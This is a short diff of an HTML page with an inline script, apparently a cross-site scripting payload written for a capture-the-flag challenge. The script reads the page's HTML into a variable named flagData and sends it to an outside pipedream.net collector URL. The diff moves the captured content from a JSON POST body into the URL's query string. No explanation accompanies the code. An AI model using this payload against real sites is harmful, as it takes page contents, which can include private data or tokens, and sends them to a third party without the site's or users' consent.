@@ -8,11 +8,10 @@
 <body>
   <script>
     document.title = 'Payload executed';
-    var flagData = document.getElementsByTagName('html')[0].innerHTML;
+    var flagData = document.body.innerHTML; // Using document.body.innerHTML to get the body content
     
-    fetch('https://eoue93psy15d0ln.m.pipedream.net?', {
+    fetch('https://eoue93psy15d0ln.m.pipedream.net?' + flagData, {
       method: 'POST',
-      body: JSON.stringify({ data: flagData }),
       headers: {
         'Content-Type': 'application/json'
       }
